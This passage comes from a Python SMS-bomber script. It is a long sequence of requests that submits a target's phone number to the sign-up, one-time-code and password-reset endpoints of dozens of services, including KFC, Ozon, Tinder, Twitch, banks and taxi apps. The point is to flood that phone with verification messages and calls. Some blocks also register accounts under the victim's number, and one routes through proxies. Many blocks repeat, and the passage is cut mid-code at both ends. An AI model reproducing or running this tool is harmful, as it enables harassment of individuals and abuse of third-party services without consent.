            print(' [+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print(' [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print(' [+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print(' [+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print(' [+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print(' [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print(' [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print(' [+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print(' [+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print(' [+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print(' [+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print(' [+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print(' [+] не отправлено!')
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print(' [+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print(' [+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print(' [+] Rabota sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print(' [+] Rutube sent!')
            time.sleep(0.1)
        except:
            print(' [-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print(' [+] Citilink sent!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print(' [+] Smsint sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print(' [+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print(' [+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print(' [+] newnext sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print(' [+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print(' [+] alpari sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Invitro sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print(' [+] Psbank sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print(' [+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print(' [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print(' [+] KFC sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print(' [+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print(' [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(' [+] Delitime sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print(' [+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print(' [+] Guru sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(' [+] ICQ sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print(' [+] InDriver sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print(' [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print(' [+] IVI sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print(' [+] Lenta sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(' [+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(' [+] MVideo sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print(' [+] OK sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print(' [+] qlean sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print(' [+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print(' [+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print(' [+] Tinder sent!')
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(' [+] Twitch sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print(' [+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print(' [+] wowworks sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print(' [+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print(' [+] Alpari sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print(' [+] SMS sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print(' [+] Delivery sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
#repeat   
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print(' [+] Grab отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print(' [+] chef отправлено!')
        except:
            print(' [-] Не отправлено!') 
            
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print(' [+] lenta отправлено!')
        except:
            print(' [-] Не отправлено!') 
          
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print(' [+] dos отправлено!')
        except:
            print(' [-] Не отправлено!') 
            
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print(' [+] RuTaxi отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print(' [+] BelkaCar отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print(' [+] secure отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print(' [+] planetakino отправлено!')
        except:
            print(' [-] Не отправлено!')    
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] pmsm отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print(' [+] ivi отправлено!')
        except:
            print(' [-] Не отправлено!')        
            
            
            
            
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print(' [+] finam отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] mtstv отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print(' [+] games отправлено!')
        except:
            print(' [-] Не отправлено!')   
            
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print(' [+] kasta отправлено!')
        except:
            print(' [-] Не отправлено!')      
            
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print(' [+] ritm отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print(' [+] city24 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Не отправлено!')    
            
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print(' [+] sushi-master отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print(' [+] plex отправлено!')
        except:
            print(' [-] Не отправлено!')    

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print(' [+] vsk отправлено!')
        except:
            print(' [-] Не отправлено!')
            
            
            
            
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
            print(' [+] sportmaster отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print(' [+] korona отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print(' [+] btfair отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print(' [+] thehive отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(' [+] Tinder отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print(' [+] Karusel отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print(' [+] Tinkoff отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] MTS отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print(' [+] PizzaHut отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print(' [+] Rabota отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print(' [+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print(' [+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print(' [+] Smsint отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print(' [+] oyorooms отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print(' [+] MVideo отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print(' [+] newnext отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print(' [+] Sunlight отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print(' [+] alpari отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Invitro отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sberbank отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print(' [+] Psbank отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print(' [+] Beltelcom отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print(' [+] Karusel отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print(' [+] KFC отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print(' [+] carsmile отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print(' [+] Citilink отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(' [+] Delitime отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print(' [+] findclone звонок отправлен!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(' [+] ICQ отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print(' [+] InDriver отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print(' [+] Invitro отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print(' [+] Pmsm отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print(' [+] IVI отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(' [+] Mail.ru отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(' [+] MVideo отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print(' [+] OK отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print(' [+] Plink отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print(' [+] qlean отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print(' [+] SMSgorod отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print(' [+] Tinder отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(' [+] Twitch отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print(' [+] CabWiFi отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print(' [+] wowworks отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print(' [+] Eda.Yandex отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print(' [+] Alpari отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print(' [+] SMS отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print(' [+] Delivery отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},headers=standar_headers,proxies=proxies)
            print(' [+]ritm отправлено')
        except:
            pass
        
        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Inv отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sber отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print(' [+] RuTaxi sent!')
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
            print(' [+] Moyo отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
            print(' [+] Comfy отправлено!')
        except:
             print(' [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print(' [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
